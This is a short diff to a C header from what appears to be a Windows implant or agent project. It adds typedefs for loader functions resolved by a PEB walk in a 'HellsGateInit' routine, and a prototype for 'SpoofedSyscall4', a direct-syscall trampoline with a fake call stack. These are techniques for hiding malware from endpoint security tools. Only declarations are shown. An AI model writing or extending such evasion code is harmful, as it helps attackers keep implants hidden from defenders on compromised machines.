@@ -70,6 +70,15 @@ typedef struct {
     int   exit_code;
 } AgentResult;
 
+/* ── IAT-bootstrap function pointers (resolved via PEB walk in HellsGateInit) */
+typedef HMODULE (WINAPI *pfnGetModuleHandleA_t)(LPCSTR);
+typedef HMODULE (WINAPI *pfnLoadLibraryA_t)(LPCSTR);
+typedef FARPROC (WINAPI *pfnGetProcAddress_t)(HMODULE, LPCSTR);
+
+extern pfnGetModuleHandleA_t  g_GetModuleHandleA;
+extern pfnLoadLibraryA_t      g_LoadLibraryA;
+extern pfnGetProcAddress_t    g_GetProcAddress;
+
 /* ── Global agent state (defined in entry.c) ─────────────────────────────── */
 extern AgentState g_agent;
 
@@ -134,6 +143,10 @@ void     InitCallstackGadgets(PVOID ntdllBase);
 
 /* ASM trampoline — NtWaitForSingleObject with multi-level fake call stack */
 NTSTATUS SpoofedNtWait(HANDLE hObject, BOOLEAN alertable, PLARGE_INTEGER timeout);
+
+/* ASM trampoline — generic ≤4-reg-arg syscall with multi-level fake call stack.
+ * Caller sets g_ssn via HellsGateSetSSN() before calling. */
+NTSTATUS SpoofedSyscall4(PVOID a1, PVOID a2, PVOID a3, PVOID a4);
 
 /* crypto.c */
 BOOL CryptoInit(void);
